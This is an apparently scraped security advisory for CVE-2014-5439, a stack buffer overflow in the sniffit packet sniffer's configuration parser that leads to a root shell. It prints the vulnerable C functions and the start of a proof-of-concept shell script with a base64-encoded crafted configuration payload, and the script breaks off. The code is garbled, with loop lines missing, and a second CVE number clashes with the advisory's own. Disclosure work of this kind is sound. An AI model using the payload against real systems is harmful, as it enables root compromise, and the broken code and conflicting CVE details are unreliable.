{
    "text": "title : Sniffit Root Shell  ， detail : A specially-crafted sniffit configuration file can be leveraged to execute code as root.  ， cve : advisories | CVE-2014-5439  ，  ， desc : CVE-2014-5439 - Root shell on Sniffit  ， Authors : Ismael Ripoll & Hector Marco  ， CVE : CVE-2014-5439  ， Dates : July 2014 - Discovered the vulnerability  ， Description  ， Sniffit is a packet sniffer and monitoring tool. A bug in sniffit prior to 0.3.7 has been found. The bug is caused by an incorrect implementation of the functions clean_filename (  ) and clean_string (  ) which causes a stack buffer overflow when parsing a configuration file with \"long\" paths ( more than 20 characters ) .  ， The attacker can to create a specially-crafted sniffit configuration file , which is able to bypass all three protection mechanisms :   ， Non-eXecutable bit NX  ， Stack Smashing Protector SSP  ， Address Space Layout Randomisation ASLR  ， And execute arbitrary code with root privileges ( the id of the user that launches the sniffit ) .  ， The new issue has been assigned CVE-2014-7169.  ， The presented PoC successfully exploits the vulnerability.  ， Impact  ， To use the sniffit , the application need to be executed with root privileges. Typically by sudo or pkexec or setting the UID bit. Since this tool requires this privilege to execute the sniffer , only allowing to a user execute the sniffer is enough to execute commands as root.  ， Vulnerable packages  ， The sniffit 0.3.7 and prior are affected. Currently , this tool is in the universe repository installable via apt-get install sniffit. For example , the sniffit is available on Ubuntu 14.04.1 LTS and prior.  ， Vulnerability  ， The vulnerability is caused due to incorrect implementation of the functions clean_filename (  ) and clean_string (  ) . These functions suffer from a stack buffer overflow.  ， The bug appears in file sn_cfgfile.c on the following functions :   ， char * clean_string ( char * string ) {  ， char help [ 20 ]  ;   ， int i , j ;   ， j=0 ;   ，   ， help [ j ] =string [ i ]  ;   ， help [ j+1 ] =0 ;   ， }  ， j+ ;   ， }  ， strcpy ( string , help )  ;   ，  ， }  ，   ， char * clean_filename ( char * string ) {  ， char help [ 20 ]  ;   ， int i , j ;   ， j=0 ;   ，   ， help [ j ] =string [ i ]  ;   ， help [ j+1 ] =0 ;   ， }  ， j+ ;   ， }  ， strcpy ( string , help )  ;   ，  ， }  ， Exploit ( PoC )   ， I have built an exploit to bypass the three most popular protections techniques : Non-eXecutable bit NX , Stack Smashing Protector SSP and Address Space Layout Randomisation ASLR. The exploit finally obtains a root shell. The exploit was successfully tested with Ubuntu 14.04.1 LTS ( trusty ) with kernel 3.13.0-32-generic ( x86_64 ) fully updated.  ， The sniffit exploit is a shell script which will creates a specially-crafted configuration file \"exploit-sniffit-0.3.7-shell.cfg\". Passing this configuration file to sniffit through the \"-c\" option we will obtain a root shell.  ， - start exploit-sniffit-0.3.7-shell.sh exploit -  ， cfgfile='  ， bG9nZmlsZSAvL2Jpbi9zaApsb2dmaWxlIIiIiIiIiIiImZmZmZmZmZmqqqqqqqqqqgYGBgYGBgYG  ， QUFBQUFBQUEHBwcHBwcHB0NDQ0NDQ0NDRERERERERERFRUVFRUVFRUZGRkZGRkZGR0dHR0dHR0dJ  ， P0AGBgYGBiH8YAYGBgYGKzxABgYGBgYh/GAGBgYGBtWbQAYGBgYGCkV4cGxvaXQgYnkgSGVjdG9y  ， IE1hcmNvIDxobWFyY29AaG1hcmNvLm9yZz4KaHR0cDovL2htYXJjby5vcmcK'  ， echo \"  ， echo \"-=-\"  ， echo \"-=-\"  ， echo \"  ， echo \" Author : Hector Marco-Gisbert <hmarco @ hmarco.org>\"",
    "time": "Nov 27, 2014"
}